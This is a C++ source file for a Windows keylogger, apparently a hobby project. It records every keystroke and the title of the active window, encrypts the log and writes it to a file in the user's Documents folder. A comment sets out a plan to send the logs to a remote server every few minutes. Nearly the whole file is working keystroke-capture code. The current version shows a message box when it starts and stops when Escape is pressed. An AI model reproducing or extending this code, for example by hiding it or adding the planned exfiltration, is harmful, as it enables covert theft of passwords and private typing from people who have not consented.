// Bug 1: if a key is held down it only detects the input once

// Future features	
// Make it send all the information to a server I set up, possibly every 5 minutes or so
// Clean up code

#include <fstream> // Write to file
#include <windows.h> // Get key presses
#include <time.h> // Get current time
#include <string>

const int KEY_RANGE = 83; // Set to 1 higher than number of keys initialised
const int BUFFER_DUMP_LENGTH = 128; // Flush buffer to file when it reaches this size
const int MAX_WINDOW_LENGTH = 128; // Will truncate window titles longer than 128 chars
const int CMD_KEY_COUNT = 3; // Number of command keys
char ckey; // Fix this later, shouldn't be global

class vkey;

void initialise_vkeys(vkey (&vkey_list)[KEY_RANGE], vkey* cmd_keys[CMD_KEY_COUNT]);
void write_output(std::string &buffer, std::string file_path, std::string additional_message);
void check_window_state(std::string& old_window_name, std::string& buffer, std::string file_path);
std::string get_file_path();
char get_key();
//int encrypt_char(char& val, char ckey);
int encrypt_string(std::string& val, char ckey);

class vkey {
private:
    bool was_down; // Whether key was down in previous iteration. Used to make sure each keypress only registers once
    std::string lower_case;
    std::string upper_case;
    int vk_state;
public:
    void detect_press(std::string &buffer, bool& cmd_key_down) { // Finished code
        if (is_pressed()) {
            if (!was_down) {
                buffer_output(buffer, cmd_key_down);
            }
            was_down = true;
        }
        else was_down = false;
    }

    bool is_pressed() {
        return GetAsyncKeyState(vk_state);
    }

    void buffer_output(std::string& buffer, bool& cmd_key_down) { // Finished code
        std::string new_output;
        if (!GetAsyncKeyState(VK_SHIFT) || upper_case.empty()) new_output = lower_case;
        else new_output = upper_case;
        if (cmd_key_down && new_output != "") { // Makes sure it doesn't add () to empty key value such as shift
            new_output.insert(0,"(");
            new_output.append(")");
        }
        buffer.append(new_output);
    }

    vkey() { // Default constructor
        was_down = false; // Tracks whether button was down in previous iteration of main loop
        lower_case = "";
        upper_case = "";
        vk_state = 0;
    }
    vkey(std::string s1, std::string s2, int i1) { // Constructor for case sensitive keys
        was_down = false;
        lower_case = s1;
        upper_case = s2;
        vk_state = i1;
    }
    vkey(std::string s1, int i1) { // Constructor for case insensitive keys
        was_down = false;
        lower_case = s1;
        upper_case = ""; // Saves memory compared to setting it to s1
        vk_state = i1;
    }
};

void initialise_vkeys(vkey (&vkey_list)[KEY_RANGE], vkey* cmd_keys[CMD_KEY_COUNT]) { // Finished code
    const std::string character_list = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789)!\"£$%^&*(";
    for (int i = 0; i < 36; i++) { // Create letters and numbers
        char c = character_list[i]; // Get ith character from string
        if (i <= 25)
        {
            vkey_list[i] = vkey(std::string(1, tolower(c)), std::string(1, c), int(c)); // A to Z
            if (i <= 11) vkey_list[46+i] = vkey("(F" + std::to_string(i+1) + ")", VK_F1 + i); // F1 to F12
        }
        else {
            vkey_list[i] = vkey(std::string(1, c), std::string(1, character_list[i + 10]), int(c)); // 0 to 9
            vkey_list[i + 10] = vkey(std::string(1, c), VK_NUMPAD0 + i - 26); // Numpad keys
        }
    }
    vkey_list[58] = vkey(" ", VK_SPACE);
    vkey_list[59] = vkey("(Rtrn)", VK_RETURN);
    vkey_list[60] = vkey("(Bksp)", VK_BACK);
    vkey_list[61] = vkey("(Tab)", VK_TAB);
    vkey_list[62] = vkey("(Ctrl)", VK_CONTROL);
    vkey_list[63] = vkey("(Alt)", VK_MENU);
    vkey_list[64] = vkey("", VK_SHIFT);
    vkey_list[65] = vkey(";", ":", VK_OEM_1);
    vkey_list[66] = vkey("/", "?", VK_OEM_2);
    vkey_list[67] = vkey("'", "@", VK_OEM_3); 
    vkey_list[68] = vkey("=", "+", VK_OEM_PLUS);
    vkey_list[69] = vkey("-", "_", VK_OEM_MINUS);
    vkey_list[70] = vkey(",", "<", VK_OEM_COMMA);
    vkey_list[71] = vkey(".", ">", VK_OEM_PERIOD);
    vkey_list[72] = vkey("[", "{", VK_OEM_4);
    vkey_list[73] = vkey("]", "}", VK_OEM_6);
    vkey_list[74] = vkey("\\", "|", VK_OEM_5);
    vkey_list[75] = vkey("#", "~", VK_OEM_7);
    vkey_list[76] = vkey("(Del)", VK_DELETE);
    vkey_list[77] = vkey("(Win)", VK_LWIN);
    vkey_list[78] = vkey("`","¬", VK_OEM_8);
    vkey_list[79] = vkey("(Up)", VK_UP);
    vkey_list[80] = vkey("(Down)", VK_DOWN);
    vkey_list[81] = vkey("(Left)", VK_LEFT);
    vkey_list[82] = vkey("(Right)", VK_RIGHT);

    cmd_keys[0] = &vkey_list[62]; // Ctrl key
    cmd_keys[1] = &vkey_list[63]; // Alt key
    cmd_keys[2] = &vkey_list[77]; // Windows key
}

std::string get_file_path() { // Sets file write location to C:\Users\<User>\Documents\Keylogger\Keylog<time>.txt". Possibly clean this up later.
    char* cPath = getenv("HomeDrive");
    std::string path = std::string(cPath);
    cPath = getenv("HomePath");
    path.append(cPath);
    path.append("\\Documents\\Keylogger\\keylog" + std::to_string(time(0)) + ".txt");
    return path;
}

void write_output(std::string& buffer, std::string file_path, std::string additional_message = "") {
        std::ofstream log_file(file_path, std::ios::out | std::ios::app);
        if (log_file.is_open()) {
            time_t current_time = time(0);
            char* cformatted_time = ctime(&current_time);
            std::string formatted_time = std::string(cformatted_time);
            formatted_time.pop_back(); // Removes newline from formatted date
            std::string file_message = "[" + formatted_time + "]" + buffer + additional_message + '\n';
            encrypt_string(file_message, ckey);
            log_file << file_message;
            log_file.close();
        }
        buffer = "";
}

void check_window_state(std::string& old_window_name, std::string& buffer, std::string file_path) {
    HWND new_window = GetForegroundWindow();
    char window_name[MAX_WINDOW_LENGTH];
    GetWindowTextA(new_window, window_name, MAX_WINDOW_LENGTH);
    std::string new_window_name = std::string(window_name);
    if (old_window_name != new_window_name && new_window_name != "") {
        write_output(buffer, file_path, "<<" + new_window_name + ">>");
    }
    old_window_name = new_window_name;
}

int APIENTRY wWinMain(_In_ HINSTANCE hInstance, // Run in invisible window
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPWSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{
    MessageBoxA(NULL, "Keylogger running", "Keylogger", MB_OK);
    vkey vkey_list[KEY_RANGE];
    vkey* cmd_keys[CMD_KEY_COUNT];
    initialise_vkeys(vkey_list, cmd_keys);
    const std::string file_path = get_file_path();
    std::string buffer = "";
    std::string old_window_name = "";
    bool cmd_key_down;
    ckey = get_key();
    std::ofstream log_file(file_path, std::ios::out | std::ios::app);
    if (log_file.is_open()) {
        log_file << ckey << '\n';
        log_file.close();
    }
    while (1) {
        if (GetAsyncKeyState(VK_ESCAPE)) { // Terminate program when escape is pressed
            // Fix possible memory leak later
            write_output(buffer, file_path, "<<KEYLOGGER TERMINATED>>");
            MessageBoxA(NULL, "Keylogger ended", "Keylogger", MB_OK);
            break;
        }
        // Check whether a command key is pressed
        cmd_key_down = false;
        for (int i = 0; i < CMD_KEY_COUNT; i++) {
            if ((*cmd_keys[i]).is_pressed()) cmd_key_down = true;
        }
        // Loop through keys
        for (int i = 0; i < KEY_RANGE;  i++) {
        vkey_list[i].detect_press(buffer,cmd_key_down);
        }
        // If window changes write output to file
        check_window_state(old_window_name, buffer, file_path);
        // Write output to file when buffer string is long enough, or tab is pressed
        if (buffer.length() >= BUFFER_DUMP_LENGTH) {
            write_output(buffer, file_path);
        }
        Sleep(10);
    }
    return 0;
}